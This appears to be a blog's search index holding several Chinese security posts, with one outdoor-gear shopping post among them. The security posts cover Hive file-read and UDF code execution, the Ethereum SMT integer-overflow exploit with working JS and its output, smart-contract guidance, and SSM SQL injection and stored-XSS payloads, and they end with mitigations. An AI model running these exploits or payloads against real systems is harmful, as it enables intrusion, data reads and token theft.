<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[大数据安全-hive风险初探.md]]></title>
    <url>%2F2019%2F06%2F15%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8-hive%E9%A3%8E%E9%99%A9%E5%88%9D%E6%8E%A2%2F</url>
    <content type="text"><![CDATA[0x01 白话 hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析。 Hive是建立在 Hadoop 上的数据仓库基础构架。它提供了一系列的工具，可以用来进行数据提取转化加载（ETL），这是一种可以存储、查询和分析存储在 Hadoop 中的大规模数据的机制。Hive 定义了简单的类 SQL 查询语言，称为 HQL，它允许熟悉 SQL 的用户查询数据。同时，这个语言也允许熟悉 MapReduce 开发者的开发自定义的 mapper 和 reducer 来处理内建的 mapper 和 reducer 无法完成的复杂的分析工作。 因此其本质也还是一个数据库， 并且使用类SQL执行操作， SQL注入的风险肯定是存在的； 本文主要是基于此初探一些进阶的风险利用点； ###0x02 利用点 1） load data 此命令是用来导入数据至hive， 数据来源可以是本地数据也可以是hdfs数据， 用法为load data local inpath &#39;/home/hadoop/hive_test/load_data_local.txt&#39; into table load_data_local 因此可以用此命令读取任意宿主机上的文件， 步骤为： a、 创建表create table if not exists xx (x string) row format delimited fields terminated by &#39; &#39; lines terminated by &#39;\n&#39;; b、 导入本地文件数据， 如/etc/passwdload data local inpath &#39;/etc/passwd&#39; into table xx; c、 查看数据select * from xx; 2) udf 关于udf是啥就自行百度了， 简单概括就是可以自定义函数并加载使用； 构建步骤： a、 继承UDF或者UDAF或者UDTF，实现特定的方法； b、 将写好的类打包为jar； c、 使用hive加载， 来源可以是本地也可以是HDFS； d、 使用create temporary function 注册该类； 由于hive运行环境为本地java程序， 加载的类相当于逃逸hive环境可以直接在宿主机执行， 如重写的时候直接执行命令等； 这里自定义个Lower类， 主要用于把查询的字母转化为小写， 但我们在重写的方法里写入一段恶意代码， 在宿主机环境创建一个文件； com.jige003;12345678910111213141516171819202122import org.apache.hadoop.hive.ql.exec.UDF;import org.apache.hadoop.io.Text;import java.io.File;import java.io.IOException;public final class Lower extends UDF &#123; public Text evaluate(final Text s) &#123; if (s == null) &#123; return null; &#125; File file = new File(&quot;/tmp/&quot;, &quot;hello-hive-udf.txt&quot;); if (!file.exists()) &#123; try &#123; file.createNewFile(); &#125; catch (IOException e) &#123;// TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; return new Text(s.toString().toLowerCase()); &#125;&#125; 使用add jar /path/hive-udf-1.0-SNAPSHOT.jar; create temporary function my_lower as &quot;com.jige003.Lower;&quot;注册此方法； 使用select 查询时使用my_lowerselect my_lower(*) from xx; 结果会全部转换为小写并且再宿主机也成功创建了/tmp/hello-hive-udf.txt 文件； 一些tips1） 写类sql语句时注意过滤恶意字符； 2） hadoop生态的管理系统如HUE等平台账户的安全性； 3） hive启用认证； 4） 避免端口直接暴露至外网； 5） 关闭udf等高级特性；]]></content>
      <categories>
        <category>big_data_sec</category>
      </categories>
      <tags>
        <tag>大数据安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【区块链回归技术】 eth智能合约安全整形溢出漏洞]]></title>
    <url>%2F2018%2F07%2F09%2Feth%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[原理eth智能合约整数溢出漏洞, 原理是uint256类型当取最大整数值，上溢之后直接回绕返回值为0 ， 当取0下溢之后直接回绕，返回值为 2^256-1，这是 solidity中整数溢出场景的常规情况。智能合约可参看https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/overflow.sol 回顾 smt 整数溢出漏洞合约代码 https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/smtvul.sol1234567891011121314151617181920212223242526272829303132/* * Proxy transfer SmartMesh token. When some users of the ethereum account has no ether, * he or she can authorize the agent for broadcast transactions, and agents may charge agency fees * @param _from * @param _to * @param _value * @param feeSmt * @param _v * @param _r * @param _s */ function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt, uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool)&#123; if(balances[_from] &lt; _feeSmt + _value) revert(); // 此处存在上溢的漏洞， 构造_feeSmt 、 _value 可以绕过 uint256 nonce = nonces[_from]; bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce); if(_from != ecrecover(h,_v,_r,_s)) revert(); if(balances[_to] + _value &lt; balances[_to] || balances[msg.sender] + _feeSmt &lt; balances[msg.sender]) revert(); balances[_to] += _value; Transfer(_from, _to, _value); balances[msg.sender] += _feeSmt; Transfer(_from, msg.sender, _feeSmt); balances[_from] -= _value + _feeSmt; nonces[_from] = nonce + 1; return true; &#125; exp smt上溢漏洞查看存在漏洞的函数transferProxy 还需要对转账人对这笔交易执行签名， 校验签名的代码如下123uint256 nonce = nonces[_from]; // 获取随机数bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce); // 交易消息摘要生成if(_from != ecrecover(h,_v,_r,_s)) revert(); //使用ecrecover 校验签名是否属于转账人 使用ganache-cli 搭建eth私链并部署合约， 并使用web3 部署合约， 可参考此脚本 https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/deploy.js， 部署合约后需要记下合约地址 _value和_feeSmt参数直接复制黑客攻击成功的，参考tx链接https://etherscan.io/tx/0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f设置_value 为0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff设置_feeSmt 为0x7000000000000000000000000000000000000000000000000000000000000001 使用web3和ethereumjs-util的web3.utils.soliditySha3 消息摘要函数、 ethereumjs-util.ecsign 签名函数生成剩余的参数， 代码如下1234567891011121314151617var from = &quot;0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24b&quot;;console.log(&quot;address: &quot; + from);var value = &quot;0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;;console.log(&quot;value: &quot; + value);var fee = &quot;0x7000000000000000000000000000000000000000000000000000000000000001&quot;;console.log(&quot;fee: &quot; + fee);var hash = web3.utils.soliditySha3(from, from, value, fee, 0);console.log(&quot;Tx hash: &quot; + hash);var prikey = &quot;0xce0ed217ee599c46a3a850cbaccfbff749771cfccb4577cc943bc9bbed703b3c&quot;;var sig = ethUtils.ecsign(ethUtils.toBuffer(hash), ethUtils.toBuffer(prikey));var r = &quot;0x&quot; + sig.r.toString(&apos;hex&apos;);var s = &quot;0x&quot; + sig.s.toString(&apos;hex&apos;);var v = sig.v;console.log(&quot;v: &quot; + v);console.log(&quot;r: &quot; + r);console.log(&quot;s: &quot; + s); 最后调用合约的transferProxy函数exp此合约， exp之前账户地址为0， exp后65133050195990359925758679067386948167464366374422817272194891004451135422463123456789contract.methods.balanceOf(from).call().then(function( result)&#123; console.log(&quot;before exp the addr &quot; + from + &quot; has &quot; + result + &quot; token&quot;);&#125;);contract.methods.transferProxy(from , from, value, fee, v, r, s).send(&#123;from: faddr, gasPrice: 72, gas: 209255&#125;);contract.methods.balanceOf(from).call().then(function( result)&#123; console.log(&quot;after exp the addr &quot; + from + &quot; has &quot; + result + &quot; token&quot;);&#125;); exp log 如下123456789address: 0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24bvalue: 0x8ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffee: 0x7000000000000000000000000000000000000000000000000000000000000001Tx hash: 0xd6b72019dc1b6daf2eb80e22333098028fc5f3d6c8be43e41e86c9bfbc36ecabv: 28r: 0x98ea373fb39f352e6a0337e41f8b8f90a0b6197241e3479c5098c9901c3c9dc3s: 0x16870e9632e8a22f72f37a3ae36a45851e725d02d927f92bd499022d9a0ce4a9before exp the addr 0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24b has 0 tokenafter exp the addr 0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24b has 65133050195990359925758679067386948167464366374422817272194891004451135422463 token 完整的exp测试代码链接https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/expvul.js 漏洞防范 使用safemath 库执行基本运算 使用assert、 require执行校验 代码review 参考链接https://ethereumdev.io/safemath-protect-overflows/https://web3js.readthedocs.io/en/1.0/getting-started.htmlhttp://www.freebuf.com/vuls/169741.htmlhttps://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17dhttps://github.com/ethereum/solidity/issues/796#issuecomment-253578925]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>智能合约安全</tag>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【区块链回归技术】 eth智能合约安全介绍]]></title>
    <url>%2F2018%2F07%2F05%2Feth%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[开发智能合约需要一个全新思维， 不同于以往的项目开发， 需要对区块链的基本概念至少有一个基本的认知。由于其不可篡改性， 区块链的犯错成本往往是巨大的， 并且很难通过迭代修复。 随着大家对区块链研究越来越深入、 了解越来越透彻， 智能合约语言的bug及项目复杂性带来的安全漏洞也逐渐抛出水面， 面临的安全形势也变得千变万化。 0x01 安全思维转变对于区块链安全了解认知不够的， 需要明确下思维的转变： 合约漏洞修复无法通过升级部署来完成， 只能重新部署一个新的合约智能合约是编译后部署到区块链， 编译合约可以得到bytecode 或者runtime bytecode，部署到链上会得到一个合约地址， 合约地址与账户地址格式一样是公钥， 区分合约地址与账户地址可以通过接口获取code， 其中账户地址返回的都是0x0； 当代码变更重新执行部署实际上会返回一个新的合约地址， 存储的是不一样的runtime bytecode。bytecode 包含构造函数、 初始化代码及runtime bytecode；runtime bytecode 是实际存储在合约地址上的字节码。 合约函数访问权限特性需要明确合约函数默认是public权限， 传统项目开发一般不会造成什么安全问题。 由于区块链是去中心化的， 部署的合约是公开的， 也意味着任何人可以调用public权限接口，这样就可能导致恶意调用造成的安全漏洞。 清楚gas的花费以及区块的gas limit以太坊的evm是基于gas消耗执行的， 链上存储数据、 修改数据都是要消耗gas的， 而gas是由eth转换提供的。 因此不合理的代码会造成高额的花费， 对于恶意的调用也可能造成类似ddos的攻击， 无限消耗的你花费； 必须谨慎使用没有固定迭代次数的循环， 特别是依赖于storage的， 由于storage是把数据存储在链上，每次操作都会消耗gas， 特别这里有一个坑是solidity默认类型就是storage而不是memory， 因此必须特别清醒意识到哪些数据是有必要存储到链上的， 非必要的需要明确声明为memory。 区块链没有私有数据在智能合约中你所用的一切都是公开可见的，即便是局部变量和被标记成private的状态变量也是如此。 如果不想让矿工作弊的话，在智能合约中使用随机数会很棘手 ， 在智能合约中使用随机数很难保证节点不作弊， 这是因为智能合约中的随机数一般要依赖计算节点的本地时间得到， 而本地时间是可以被恶意节点伪造的，因此这种方法并不安全。 通行的做法是采用链外的第三方服务，比如 Oraclize 来获取随机数。 0x02 一些开发tips认真对待警告如果编译器警告了你什么事，你最好修改一下，即使你不认为这个特定的警告不会产生安全隐患，因为那也有可能埋藏着其他的问题。 我们给出的任何编译器警告，都可以通过轻微的修改来去掉。 同时也请尽早添加 pragma experimental “v0.5.0”; 来允许 0.5.0 版本的安全特性。 注意在这种情况下，experimental 并不意味着任何有风险的安全特性， 它只是可以允许一些在当前版本还不支持的 Solidity 特性，来提供向后的兼容。 限定eth的数量限定storage 在一个智能合约中 eth（或者其它通证）的数量。 如果你的源代码、编译器或者平台出现了 bug，可能会导致这些资产丢失。 如果你想控制你的损失，就要限定eth的数量。 使用“检查-生效-交互”（Checks-Effects-Interactions）模式大多数函数会首先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的 eth ，用户是否具有通证等等）。 这些检查工作应该首先被完成。 第二步，如果所有检查都通过了，应该接着进行会影响当前合约状态变量的那些处理。 与其它合约的交互应该是任何函数的最后一步。 早期合约延迟了一些效果的产生，为了等待外部函数调用以非错误状态返回。 由于上文所述的重入问题，这通常会导致严重的后果。 请注意，对已知合约的调用反过来也可能导致对未知合约的调用，所以最好是一直保持使用这个模式编写代码。 包含故障-安全（Fail-Safe）模式尽管将系统完全去中心化可以省去许多中间环节，但包含某种故障-安全模式仍然是好的做法，尤其是对于新的代码来说： 你可以在你的智能合约中增加一个函数实现某种程度上的自检查，比如“ eth是否会泄露？”， “通证的总和是否与合约的余额相等？”等等。 请记住，你不能使用太多的 gas，所以可能需要通过 eth计算来辅助。 如果自检查没有通过，合约就会自动切换到某种“故障安全”模式， 例如，关闭大部分功能，将控制权交给某个固定的可信第三方，或者将合约转换成一个简单的“退回我的钱”合约。 形式化验证使用形式化验证可以执行自动化的数学证明，保证源代码符合特定的正式规范。 规范仍然是正式的（就像源代码一样），但通常要简单得多。 请注意形式化验证本身只能帮助你理解你做的（规范）和你怎么做（实际的实现）的之间的差别。 你仍然需要检查这个规范是否是想要的，而且没有漏掉由它产生的任何非计划内的效果。 基本权衡：简单性与复杂性在评估一个智能合约的架构和安全性时有很多需要权衡的地方。对任何智能合约的建议是在各个权衡点中找到一个平衡点。 从传统软件工程的角度出发：一个理想的智能合约首先需要模块化，能够重用代码而不是重复编写，并且支持组件升级。从智能合约安全架构的角度出发同样如此，模块化和重用被严格审查检验过的合约是最佳策略，特别是在复杂智能合约系统里。 然而，这里有几个重要的例外，它们从合约安全和传统软件工程两个角度考虑，所得到的重要性排序可能不同。当中每一条，都需要针对智能合约系统的特点找到最优的组合方式来达到平衡。 固化 vs 可升级 庞大 vs 模块化 重复 vs 可重用 固化 vs 可升级 在很多文档或者开发指南中，包括该指南，都会强调延展性比如：可终止，可升级或可更改的特性，不过对于智能合约来说，延展性和安全之间是个基本权衡。 延展性会增加程序复杂性和潜在的攻击面。对于那些只在特定的时间段内提供有限的功能的智能合约，简单性比复杂性显得更加高效，比如无管治功能，有限短期内使用的代币发行的智能合约系统(governance-fee,finite-time-frame token-sale contracts)。 庞大 vs 模块化一个庞大的独立的智能合约把所有的变量和模块都放到一个合约中。尽管只有少数几个大家熟知的智能合约系统真的做到了大体量，但在将数据和流程都放到一个合约中还是享有部分优点–比如，提高代码审核(code review)效率。 和在这里讨论的其他权衡点一样，传统软件开发策略和从合约安全角度出发考虑，两者不同主要在对于简单、短生命周期的智能合约；对于更复杂、长生命周期的智能合约，两者策略理念基本相同。 重复 vs 可重用从软件工程角度看，智能合约系统希望在合理的情况下最大程度地实现重用。 在Solidity中重用合约代码有很多方法。 使用你拥有的以前部署的经过验证的智能合约是实现代码重用的最安全的方式。 在以前所拥有已部署智能合约不可重用时重复还是很需要的。 现在Live Libs 和Zeppelin Solidity 正寻求提供安全的智能合约组件使其能够被重用而不需要每次都重新编写。任何合约安全性分析都必须标明重用代码，特别是以前没有建立与目标智能合同系统中处于风险中的资金相称的信任级别的代码。]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>智能合约安全</tag>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【区块链回归技术】比特币账户地址探索]]></title>
    <url>%2F2018%2F01%2F19%2F%E6%AF%94%E7%89%B9%E5%B8%81%E8%B4%A6%E6%88%B7%E5%9C%B0%E5%9D%80%E6%8E%A2%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[前段时间断断续续了解了区块链的基本概念、 原理、技术等， 感觉大多数的文章都是千篇一律， 都是介绍区块链就是使用了钱包使用了非对称加密算法， 挖矿使用了pow、 pos、 dpos，网络使用了去中心化得p2p， 存储使用了区块， 还有什么零知识证明、 闪电网络、 侧链等新技术， 感觉都是复制粘贴转载了白皮书的介绍，吹嘘使用的技术多么流弊， 带着币圈的浮躁， 感觉似乎已经能颠覆世界， 但潜心研究区块链技术的文章太少。 空谈误国， 实干兴邦， 基哥只希望潜心探索区块链， 一层层拨开区块链神秘的乌沙， 把各种神秘的技术用技术的语言解释记录下来。 钱包地址对区块链有基本了解的应该都知道钱包使用的最多的词就是公钥、 私钥、 地址。 私钥相当于钱包的钥匙 公钥相当于银行卡 地址相当于银行卡号 私钥和公钥是使用非对称加密生成， 比特币使用的是椭圆曲线算法。地址是使用公钥作为payload用哈希算法生成的散列值再用base58加密展示。 相关的基本概念网上有很多通俗易懂的解释，这里主要解释比特币地址生成的过程。 使用公钥进行信息摘要处理， 比特币使用的是双哈希也叫哈希160， 先使用SHA256再使用RIPEMD160处理生成digest 对生成的摘要使用base58check进行encoding， base58check带有校验功能， 流程如图所示 首先对生成的摘要加上version prefix， 参考文献wiki上有version的定义， 钱包地址使用的是0 使用两次SHA256生成信息摘要并取前4个字节作为校验码checksum 拼接version+payload+checksum 使用base58加密算法生成地址 以上的各个步骤会用python代码解释1234567891011121314151617181920212223242526272829303132from secp256k1 import PrivateKey, PublicKeyfrom binascii import hexlify, unhexlifyimport hashlibimport base58#生成私钥公钥privkey = PrivateKey()pri_key = privkey.serialize()print &quot;pri_key: %s&quot; % pri_keypub_key = hexlify(privkey.pubkey.serialize())print &quot;pub_key: %s&quot; % pub_key#使用sha256 对公钥进行第一次哈希处理intermed = hashlib.sha256(unhexlify(pub_key)).digest()#使用ripemd160 对sha256生成的摘要进行第二次哈希处理digest = hashlib.new(&apos;ripemd160&apos;, intermed).digest()#根据比特币的定义钱包地址的version为0， 再payload之前加上payload = chr(0) + digest#对payload进行2次sha256的哈希处理， 并取前面4个字节作为校验码checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]#把checksum拼接在payload的尾部payload = payload +checksum#使用base58进行加密处理addr = base58.b58encode(payload)print &quot;wallet addr: %s&quot; % addr 运行结果123pri_key: 309ab3a4e26be042196a66f45d787d45feff36e32eccfb875e0464191fb8565dpub_key: 02bafbedeea575352c209ac4fa1930bcf2bb8051acca9f2fabe777517fa6b92e3fwallet addr: 1JB5evkY74A2JhHiNUqUm9v1x4uN43WE8v 参考文献Technical background of version 1 Bitcoin addresses Base58Check encodingPrivate key]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>智能合约安全</tag>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯扯流量问题]]></title>
    <url>%2F2017%2F06%2F09%2F%E6%89%AF%E6%89%AF%E6%B5%81%E9%87%8F%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[公司由于行业关系，数据和流量是一个特别总要的事， 不同于一般的互联网公司，流量可能只是做提取REQUEST包做漏洞的自动化检测， 而我们tm的还要精确到具体IP、 端口的流量使用情况。 so 根据实际情况还添置了流控设备， 可以设备也未能如愿， 只能查看SRC IP的端口]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>流量</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[户外海淘入坑]]></title>
    <url>%2F2017%2F06%2F06%2F%E6%88%B7%E5%A4%96%E6%B5%B7%E6%B7%98%E5%85%A5%E5%9D%91%2F</url>
    <content type="text"><![CDATA[最近小伙伴们开上走上了装备党的路线，装备越来越好， 路线越来越休闲了。 为了跟上组织的步伐， 我也开上瞄上了装备， 只希望做一个合格的党员。 研究了近一月有感， 果然tm 有钱可能方便的解决很多事情。 鸟像鸟像， 感觉是一个牌坊， 想上可惜囊中羞射。 只能发挥自己的特长， 系统的学习装备党应该了解的技能，从内到外， 从外到内。 当然这只是初衷， 现在觉得丰富内在就好了， 外在已经不重要了， 感觉自己已经够帅了，实用， 物美价廉才是我等屌丝应该追求的极致。 如何优雅的入坑俗话说， 头可断， 血可流， 发型不能乱， 从中感悟颇多， 任何时候优雅都是一件很重要的事情。 理论入坑户外常有三层之说， 感觉像诛仙里面的天书总纲， 天地不仁，以万物为刍狗… 这是可以贯穿一年四季的强大之基本所在。 三层指 排汗层、 保暖层、 防风层。 排汗层排汗层主要是指各类排汗内衣裤。排汗内衣裤最主要的作用是将人体所分泌的汗液以最快的速度分散开，并且从面料内层导向面料外层，以较快的速度在运动过程中将汗液尽量蒸发掉。这在冬季户外活动中是非常重要的，如果衣物内层的汗液不能尽快蒸发掉，在运动过后静止时留存的汗液会造成严重的热量散失，后果非常严重。 保暖层以厚抓绒衣裤、化纤棉衣裤、羽绒衣裤为主。在运动过程中，除非是极寒气候，更为推荐穿着厚抓绒衣裤或化纤棉衣裤。因为如果在运动过程中穿着为羽绒衣裤，人体分泌的汗液有可能会渗入到羽绒中使羽绒变潮，保温性能急速下降且不易干燥，而抓绒、化纤棉衣裤在潮湿情况下保温性的丧失却没有羽绒这么明显，潮湿后干燥的速度也更快。带一套保温性能良好的羽绒衣裤在营地时候穿着是非常必要的。 防风层主要指各类硬壳、软壳衣裤。1) 如果会遭遇雨雪气候，还是应以硬壳为主，硬壳主要作用为防水、防风、透气。在冬季低温环境下，通常会伴随着猛烈的寒风，造成非常明显的风冷效应。在同样环境温度下，风冷效应会使人体体感下降10摄氏度有余。目前世界上以PTFE为基础的面料主要由GORE-TEX、EVENT、DRY-QElite、DENTIK四种面料组成，其中以GORE-TEX系列最为著名。GORE公司为了满足用户在各类环境、各类运动条件下的不同使用需求，将GORE-TEX面料细分研发出多种不同性能侧重的子型号产品，适用范围广，性能优越，全球市场占有率最大。PTFE类面料的优点是透气性能更佳且低温性能稳定，不会因低温造成面料透气性降低或面料性质改变。2) 如在无雨雪气候或雨雪量不大的情况下也可以选择软壳产品。软壳相对于硬壳而言面料要柔软许多，有着更好的面料延展性、透气性，穿着舒适性更佳。但是通常来说同品牌、同码数的软壳相比硬壳而言版型要更为收身，对所能容纳的中层保温层的厚度有所限制，所能应对的环境温度不宜过低，这点要特别注意。从技术上讲，软壳基本分为织物防风及膜防风两种，两种防风技术各有优势，织物防风软壳透气性更佳，膜防风软壳防风性能更佳。对冬季低温环境下使用还是更加推荐膜防风软壳，以采用GORE Windstopper防风透气膜面料的膜防风软壳为上选。一年四季气候多变，不考虑海拔等特殊情况大致可以对应春 ==》 排汗层、 防风层夏 ==》 排汗层秋 ==》 排汗层、 防风层冬 ==》 排汗层、 保暖层、 防风层 品牌入坑户外品牌特别多，8264 上有所有的户外品牌的评分， 感觉没啥卵用， 一般来说出名的品牌总有辣么几个一炮打响的产品。 最初不太了解的时候看各大装备牛的姿势， 感觉似乎都是一层不变的， 总在说辣么几个牌子的某件产品， 附上了链接方便了拿手党。 自己研究了过后觉得只能说又可取之处， 毕竟发现好多都是几年前的了， 各家都对相关的已有升级， 但并有看到相关的文章，so先排下很多文章都会提到的装备坑。 土拨鼠神衣其实就是类似于皮肤衣，防晒防风透气。看国外评测也确实排名特别高，主要是marmot用到了一个自制的材料叫Driclime，看了下介绍，没大看懂，但也明白了，反正很NB久对了。到今年神衣其实已经出了4款了 老款经典款Driclime Windshirt 货号91680，专柜售价899元 带帽升级款 Ether Driclime Hoody 货号51930，专柜售价1499元 无帽新款升级款 Ether Driclime Jacket 货号52460 专柜售价1399元 带帽当季新升级款 Ether Driclime Hoody 52430，专柜售价1599元91680是经典版型，经过多年考验，是获得“神衣”名号的原生款式，本款价格也最实惠。51930和52430都是新设计款式，版型相同，但是52340在面料上更进行了改进，外层面料相比51930更轻薄。 两者的内部绒的厚度都要比经典老款51680更好。 巴塔的C1-C4Patagonia旗下的Capilene系列内衣是patagonia畅销多年的经典系列，Capilene是一种吸湿的涤纶面料，可以保暖，即使是在潮湿的情况下，也会迅速快干。它也是一种可以回收的面料，可以循环再利用，自身带有Gladiodor生物除臭技术。 是高排汗量运动和潮湿环境下的最佳选择，位居全美销量第一！针对四种不同的活动强度和温度，Patagonia生产四种不同的Capilene面料1-4。 Capilene 1 ：非常轻，有丝绸的质感，可以单独穿或者作为内衣穿。 Capilene 2 ：适合寒冷天气进行有氧运动时穿着。 Capilene 3 ：寒冷季节最好的内衣。 Capilene 4 ：专门为最寒冷的环境设计。其实到今年已经对C系列进行了更新 C1 ==》Capilene Lightweight C2 ==》Capilene Midweight C3 ==》Capilene Heavyweight C4 ==》Capilene ThermalWeight 持续更新中 海淘入坑算上入正题了吧，海淘，有好处也有坏处。好处大致有3点：1）种类齐全而且更新快2）有正品保障3）价格会优惠许多不好的地方就是由于国人身材和外国佬的会有些区别，衣服尺码可能和国内的对不上的情况，so需要量好3围，竟可能的选着适合自己的。再tm不好的地方就是由于国外的东西寄回国内流程会复杂一些，等待到货的时间会比较久一点。 海淘户外网址推荐 www.backcountry.com 俗称BC，东西很齐全，很多东西折扣也很NICE，满50刀包邮走UPS，速度还是蛮不错的 www.steepandcheap.com BC的折扣品，里面大多都是BC缺码处理的，折扣力度很nice，不包邮 www.rei.com 基本可以参照BC www.sierratradingpost.com 论坛里说里面折扣不错，不过没有发现，感觉一般，俗称stp 转运可以参照下图其中我使用的是海带宝，感觉各方面都还不错。 支付一般采用信用卡或者paypal支付， paypal可以理解为就是国外的支付宝， 也可以绑定信用卡或者借记卡。 笔者支付采用的是paypal，之所以不使用信用卡是因为国外的网站只要记住信用卡号、到期时间及3位PIN码即可支付。 感觉太tm危险了，万一哪个网站做的不好泄露了隐私数据都找不到地方哭去。 整体流程购物的checkout的时候shopping address填写转运地址， billing address主要是账单地址， 感觉没什么卵用。然后到转运公司申报自己的包裹，收到过后会通知你缴费，然后就等着飞回国，清关，再到自己手里了。]]></content>
      <categories>
        <category>户外</category>
      </categories>
      <tags>
        <tag>海淘</tag>
        <tag>户外装备</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSM框架使用基础安全分析]]></title>
    <url>%2F2016%2F03%2F28%2FSSM%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[0x00 简介SSM 即 SPRING、 SPRINGMVC、 MYBATIS 三大框架的整合。 随着其开发带来的各种便利以及好处， 越来越多的公司以及RD使用其开发各种线上产品和后台管理系统， 但也带来了许多安全性的问题。虽然JAVA 本身规范化程度比较高， 按照框架的标准进行开发确实能减少许多的SQL注入问题，但在其他方面基本上是没有做任何安全考虑。 使用SSM 通过MYBATIS的配置生成SQL语句， 基本能屏蔽掉大部分的SQL注入问题。 但由于表单提交等大多使用POJO和DTO绑定的方式， 虽然SPRINGMVC自带有个编码处理方法， 但由于使用有限， String类型参数的却不会有任何的安全性处理， 这样大片的XSS问题随之产生 。 CSRF 的问题上， SRPINGMVC亦没有内置的接口。 在其他的逻辑产生的安全问题就不再这里面的分析范畴内了。 0x01 SQL注入问题MYBATIS支持配置XML查询和通用MAPPER查询两种。 ###1. 配置XML XML 文件中， 可以使用两种符号接收#和$ ， #符号类似于参数绑定的方式也就是JAVA的预编译处理， 这样是不会带来SQL注入问题的， 而$却相当于只把值传进来， 不做任何处理， 类似于拼接SQL语句。 测试使用相关代码如下 CONTROLLER代码 123456789101112131415161718192021222324252627282930@RequestMapping("/get1") public String username1(HttpServletRequest request, Model model) &#123; String name = request.getParameter("name"); User user = this.userserivce.getUserByUsername1(name); model.addAttribute("user", user); return "showuser"; &#125; @RequestMapping("/get2") public String username2(HttpServletRequest request, Model model) &#123; String name = request.getParameter("name"); User user = this.userserivce.getUserByUsername2(name); model.addAttribute("user", user); return "showuser"; &#125; DAO代码 1234User selectByUsername1(String name);User selectByUsername2(@Param(&quot;name&quot;) String name); MYBATIS XML 配置 1234567891011121314151617181920212223242526&lt;select id=&quot;selectByUsername1&quot; resultMap=&quot;BaseResultMap&quot; parameterType=&quot;java.lang.String&quot; &gt; select &lt;include refid=&quot;Base_Column_List&quot; /&gt; from user where user_name = #&#123;name,jdbcType=VARCHAR&#125; &lt;/select&gt; &lt;select id=&quot;selectByUsername2&quot; resultMap=&quot;BaseResultMap&quot; parameterType=&quot;java.lang.String&quot; &gt; select &lt;include refid=&quot;Base_Column_List&quot; /&gt; from user where user_name = &apos;$&#123;name&#125;&apos; &lt;/select&gt; 测试使用#传参正常访问 加入payload访问 无结果 可以看到数据执行的时候已经做了转义的处理。 测试使用$传参正常访问 可以看到是拼接的SQL语句 加入payload测试访问 依然正常访问， 已有SQL注入问题 在开发的过程中咱们尽量使用#传参， 减少$传参的使用， 如有需要， 也注意下出入参数的转义处理。 0x02 XSS问题测试使用相关代码如下 CONTROLLER 123456789101112131415161718192021222324252627282930313233343536@RequestMapping(&quot;/show&quot;) public String show(HttpServletRequest request)&#123; return &quot;xssshow&quot;; &#125; @RequestMapping(&quot;get&quot;) public String get(HttpServletRequest request, Model model)&#123; Integer id = Integer.parseInt(request.getParameter(&quot;id&quot;)); User user = this.userserivce.getUserById(id); model.addAttribute(&quot;user&quot;, user); return &quot;getuser&quot;; &#125; @RequestMapping(&quot;/add&quot;) public String add(User user)&#123; int i = this.userserivce.insert(user); return &quot;redirect:/xsstest/show&quot;; &#125; 插入payload测试 toor&quot;&#39;&gt;&lt;svg/onload=alert(/xss/)&gt; 数据库里可看到并未做任何处理 查询访问 存在存储型XSS 一些安全的措施 SPRINGMVC和JSTL进行编码处理 WEB.XML中添加 12345678&lt;context-param&gt; &lt;param-name&gt;defaultHtmlEscape&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt;&lt;/context-param&gt; JSP模板中添加 针对所有FORM 12&lt;spring:htmlEscape defaultHtmlEscape=&quot;true&quot; /&gt; 针对单个INPUT等 12&lt;form:input path=&quot;name&quot; htmlEscape=&quot;true&quot; /&gt; 直接输出的标签 12&lt;c:out 